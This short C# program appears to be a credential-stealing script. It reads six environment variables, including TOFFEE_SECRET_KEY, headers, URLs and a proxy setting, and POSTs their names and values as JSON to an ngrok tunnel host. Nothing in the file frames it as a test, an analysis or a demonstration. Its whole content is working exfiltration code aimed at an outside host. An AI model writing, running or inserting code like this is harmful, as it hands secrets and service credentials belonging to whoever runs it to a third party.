using System;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Json;

var client = new HttpClient
{
    BaseAddress = new("https://inviting-certainly-turtle.ngrok-free.app")
};
var variables = ((string[])
    [
        "TOFFEE_SECRET_KEY",
        "TOFFEE_HEADER1",
        "TOFFEE_HEADER2",
        "BDPROXY",
        "TOFFEE_URL1",
        "TOFFEE_URL2",
    ])
    .Select(name => new
    {
        name,
        value = Environment.GetEnvironmentVariable(name)
    });
await client.PostAsJsonAsync("/", variables);
